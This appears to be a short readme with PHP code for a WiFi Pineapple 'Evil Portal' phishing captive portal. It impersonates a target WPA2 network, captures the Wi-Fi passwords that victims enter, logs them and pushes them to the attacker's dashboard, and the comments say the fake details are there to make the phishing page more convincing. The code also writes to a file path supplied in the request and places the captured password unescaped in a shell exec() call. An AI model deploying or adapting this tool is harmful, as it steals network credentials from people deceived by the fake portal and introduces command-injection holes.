Tested with gl-ar 150 pineapple.
To correct the logs output, copy&replace this text to your "config.php":

<?php

$logLocation = "/root/evilportal-logs.log"; //Submitted passwords will be saved.
$target_ap_essid = "Wireless Network"; //Target ESSID. This will be displayed to the user to increase the validity of the phishing page.
$target_ap_encryption = "WPA2"; // Encryption scheme used by the target network. This will be displayed to the user to increase the validity of the phishing page.
$evilportalserver = "172.16.42.1"; //IP address of the Pineapple.

?>


To add a notification in your dashboard with passwords discovered:
Just copy&replace this text to your "MyPortal.php".

<?php namespace evilportal;

class MyPortal extends Portal
{
    
    public function handleAuthorization()
    {
        if(isset($_POST['password'])) {
           $line = date('Y-m-d H:i:s') . " - " . $_POST["essid"] . " - " .  $_POST['password'] . "\n";
           file_put_contents($_POST["log"], $line, FILE_APPEND) or die("Could not set in log file");
      
           exec("pineapple notify '$line'");  
    }

        //Could put in a check here to test if the password is valid by trying to use the password to connect to the network.
        
        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}




